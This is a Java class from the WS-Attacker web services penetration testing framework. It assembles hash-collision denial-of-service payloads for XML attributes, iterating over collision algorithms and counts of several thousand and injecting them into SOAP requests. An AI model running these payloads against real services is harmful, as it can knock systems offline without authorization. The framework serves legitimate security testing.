/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2013 Christian Altmeier
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.library.intelligentdos.dos;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import wsattacker.library.intelligentdos.common.DoSParam;
import wsattacker.library.intelligentdos.helper.IterateModel;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX31A;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33A;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionDJBX33X;
import wsattacker.plugin.dos.dosExtension.attackClasses.hashDos.CollisionInterface;
import wsattacker.plugin.dos.dosExtension.util.UtilHashDoS;

/**
 * @author Christian Altmeier
 */
public class HashCollision
    extends AbstractDoSAttack
{

    private static final int MIN_NUMBER_OF_COLLISIONS = 2;

    private final PayloadPosition[] possiblePossitions = { PayloadPosition.ATTRIBUTE };

    // defaults
    private final CollisionInterface[] defaultCollisionGenerators = { new CollisionDJBX31A(), new CollisionDJBX33A(),
        new CollisionDJBX33X() };

    private final Boolean[] defaultUseNamespace = { Boolean.FALSE };

    // 1280 8192
    private static final IterateModel defaultNumberOfCollisions =
        IterateModel.custom().startAt( 1250 ).stopAt( 33750 ).setIncrement( 3 ).setIterateStrategie( IterateModel.IterateStrategie.MUL ).build();

    private CollisionInterface[] collisionGenerators;

    private Boolean[] useNamespace;

    // Iterator(s)
    private Iterator<CollisionInterface> collisionIterator;

    private Iterator<Boolean> useNamespaceIterator;

    private IterateModel numberOfCollisions;

    // current
    private CollisionInterface currentCollisionInterface;

    private Boolean currentUseNamespace;

    private int currentNumberOfCollisions;

    public HashCollision()
    {
        collisionGenerators = defaultCollisionGenerators;
        collisionIterator = Arrays.asList( collisionGenerators ).iterator();

        useNamespace = defaultUseNamespace;
        useNamespaceIterator = Arrays.asList( useNamespace ).iterator();

        try
        {
            numberOfCollisions = defaultNumberOfCollisions.clone();
        }
        catch ( CloneNotSupportedException e )
        {
            LOG.warn( e );
        }
    }

    @Override
    public String getName()
    {
        return "HashCollision";
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getPossiblePossitions()
     */
    @Override
    public PayloadPosition[] getPossiblePossitions()
    {
        PayloadPosition[] copy = new PayloadPosition[possiblePossitions.length];
        System.arraycopy( possiblePossitions, 0, copy, 0, possiblePossitions.length );
        return copy;
    }

    public CollisionInterface[] getCollisionGenerators()
    {
        CollisionInterface[] copy = new CollisionInterface[collisionGenerators.length];
        System.arraycopy( collisionGenerators, 0, copy, 0, collisionGenerators.length );
        return copy;
    }

    public void setCollisionGenerators( CollisionInterface[] collisionGenerators )
    {
        if ( collisionGenerators == null || collisionGenerators.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.collisionGenerators = new CollisionInterface[collisionGenerators.length];
        System.arraycopy( collisionGenerators, 0, this.collisionGenerators, 0, collisionGenerators.length );
        this.collisionIterator = Arrays.asList( collisionGenerators ).iterator();
    }

    public Boolean[] getUseNamespace()
    {
        Boolean[] copy = new Boolean[useNamespace.length];
        System.arraycopy( useNamespace, 0, copy, 0, useNamespace.length );
        return copy;
    }

    public void setUseNamespace( Boolean[] useNamespace )
    {
        if ( useNamespace == null || useNamespace.length == 0 )
        {
            throw new IllegalArgumentException( "elements may not be null" );
        }

        this.useNamespace = new Boolean[useNamespace.length];
        System.arraycopy( useNamespace, 0, this.useNamespace, 0, useNamespace.length );
        this.useNamespaceIterator = Arrays.asList( useNamespace ).iterator();
    }

    public IterateModel getNumberOfCollisionsIterator()
    {
        try
        {
            return numberOfCollisions.clone();
        }
        catch ( CloneNotSupportedException ex )
        {
            Logger.getLogger( XmlElementCount.class.getName() ).log( Level.SEVERE, null, ex );
        }
        return null;
    }

    public void setNumberOfCollisionsIterator( IterateModel iterateModel )
    {
        if ( iterateModel == null )
        {
            throw new IllegalArgumentException( "iterateModel may not be null" );
        }

        numberOfCollisions = iterateModel;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#hasFurtherParams()
     */
    @Override
    public boolean hasFurtherParams()
    {
        return numberOfCollisions.hasNext() || useNamespaceIterator.hasNext() || collisionIterator.hasNext();
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#nextParam()
     */
    @Override
    public void nextParam()
    {

        if ( !initialized )
        {
            currentNumberOfCollisions = numberOfCollisions.next();
            currentUseNamespace = useNamespaceIterator.next();
            currentCollisionInterface = collisionIterator.next();

            initialized = true;
        }
        else if ( numberOfCollisions.hasNext() )
        {
            currentNumberOfCollisions = numberOfCollisions.next();
        }
        else if ( useNamespaceIterator.hasNext() )
        {
            numberOfCollisions.reset();
            currentNumberOfCollisions = numberOfCollisions.next();

            currentUseNamespace = useNamespaceIterator.next();
        }
        else if ( collisionIterator.hasNext() )
        {
            numberOfCollisions.reset();
            currentNumberOfCollisions = numberOfCollisions.next();

            useNamespaceIterator = Arrays.asList( useNamespace ).iterator();
            currentUseNamespace = useNamespaceIterator.next();

            currentCollisionInterface = collisionIterator.next();
        }

    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getCurrentParams()
     */
    @Override
    public List<DoSParam<?>> getCurrentParams()
    {
        List<DoSParam<?>> list = new ArrayList<DoSParam<?>>();
        list.add( new DoSParam<String>( "Collision Generator", currentCollisionInterface.getClass().getSimpleName() ) );
        list.add( new DoSParam<Boolean>( "Use Namespace", currentUseNamespace ) );
        list.add( new DoSParam<Integer>( "Number of Collisions", currentNumberOfCollisions ) );

        return list;
    }

    /*
     * (non-Javadoc)
     * @see
     * wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getCommentLength(wsattacker.library.intelligentdos.dos
     * .DoSAttack.PayloadPosition)
     */
    @Override
    int getCommentLength( PayloadPosition payloadPosition )
    {
        return -1;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#getTamperedRequest(java.lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getTamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        StringBuilder sb = new StringBuilder( "" );

        // create payload string for selected hash algorithms
        currentCollisionInterface.genNCollisions( currentNumberOfCollisions, sb, currentUseNamespace );

        // replace "Payload-Attribute" with Payload-String
        return payloadPosition.replacePlaceholder( xml, sb.toString() );
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#getUntamperedRequest(java.lang.String,
     * wsattacker.library.intelligentdos.dos.DoSAttack.PayloadPosition)
     */
    @Override
    public String getUntamperedRequest( String xml, PayloadPosition payloadPosition )
    {
        verifyPayloadPosition( payloadPosition );

        String generateUntampered =
            UtilHashDoS.generateUntampered( currentCollisionInterface, currentNumberOfCollisions, currentUseNamespace );

        // replace "Payload-Attribute" with Payload-String
        return payloadPosition.replacePlaceholder( xml, generateUntampered.trim() + " " );
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#minimal()
     */
    @Override
    public DoSAttack minimal()
    {
        HashCollision hashCollision = new HashCollision();
        hashCollision.currentCollisionInterface = this.currentCollisionInterface;
        hashCollision.currentNumberOfCollisions = MIN_NUMBER_OF_COLLISIONS;
        hashCollision.currentUseNamespace = Boolean.FALSE;

        return hashCollision;
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.DoSAttack#middle(wsattacker.library.intelligentdos.dos.DoSAttack)
     */
    @Override
    public DoSAttack middle( DoSAttack aThat )
    {
        if ( this == aThat )
        {
            HashCollision hashCollision = new HashCollision();
            hashCollision.currentCollisionInterface = this.currentCollisionInterface;
            hashCollision.currentNumberOfCollisions = this.currentNumberOfCollisions;
            hashCollision.currentUseNamespace = this.currentUseNamespace;
            return hashCollision;
        }

        if ( !aThat.getClass().equals( getClass() ) || !( aThat instanceof HashCollision ) )
        {
            throw new IllegalArgumentException( aThat.getClass() + " is not allowed!" );
        }

        HashCollision that = (HashCollision) aThat;

        HashCollision hashCollision = new HashCollision();
        hashCollision.currentCollisionInterface = this.currentCollisionInterface;
        hashCollision.currentUseNamespace = this.currentUseNamespace;

        if ( this.currentNumberOfCollisions == that.currentNumberOfCollisions )
        {
            hashCollision.currentNumberOfCollisions = this.currentNumberOfCollisions;
        }
        else
        {
            hashCollision.currentNumberOfCollisions =
                calculateMiddle( this.currentNumberOfCollisions, that.currentNumberOfCollisions );
        }

        return hashCollision;
    }

    @Override
    public void initialize()
    {
        super.initialize();

        collisionIterator = Arrays.asList( collisionGenerators ).iterator();
        useNamespaceIterator = Arrays.asList( useNamespace ).iterator();
        numberOfCollisions.reset();
    }

    /*
     * @see http://findbugs.sourceforge.net/bugDescriptions.html#HE_EQUALS_USE_HASHCODE (non-Javadoc)
     * @see java.lang.Object#hashCode()
     */
    @Override
    public int hashCode()
    {
        assert false : "hashCode not designed";
        return 42; // any arbitrary constant will do
    }

    /*
     * (non-Javadoc)
     * @see wsattacker.library.intelligentdos.dos.AbstractDoSAttack#equals(java.lang.Object)
     */
    @Override
    public boolean equals( Object obj )
    {
        if ( obj == null )
        {
            return false;
        }

        if ( obj == this )
        {
            return true;
        }

        if ( !obj.getClass().equals( getClass() ) )
        {
            return false;
        }

        HashCollision that = (HashCollision) obj;

        List<DoSParam<?>> paramThis = this.getCurrentParams();
        List<DoSParam<?>> paramThat = that.getCurrentParams();

        DoSParam<?> collisionGeneratorThis = paramThis.get( 0 );
        DoSParam<?> collisionGeneratorThat = paramThat.get( 0 );

        DoSParam<?> useNamespaceThis = paramThis.get( 1 );
        DoSParam<?> useNamespaceThat = paramThat.get( 1 );

        return this.getName().equals( that.getName() )
            && collisionGeneratorThis.getValueAsString().equals( collisionGeneratorThat.getValueAsString() )
            && useNamespaceThis.getValueAsString().equals( useNamespaceThat.getValueAsString() );
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Comparable#compareTo(java.lang.Object)
     */
    @Override
    public int compareTo( DoSAttack aThat )
    {
        // this optimization is usually worthwhile, and can
        // always be added
        if ( this == aThat )
            return EQUAL;

        if ( !aThat.getClass().equals( getClass() ) )
        {
            return EQUAL;
        }

        HashCollision that = (HashCollision) aThat;

        if ( this.currentNumberOfCollisions < that.currentNumberOfCollisions )
            return BEFORE;
        if ( this.currentNumberOfCollisions > that.currentNumberOfCollisions )
            return AFTER;

        return EQUAL;
    }

}
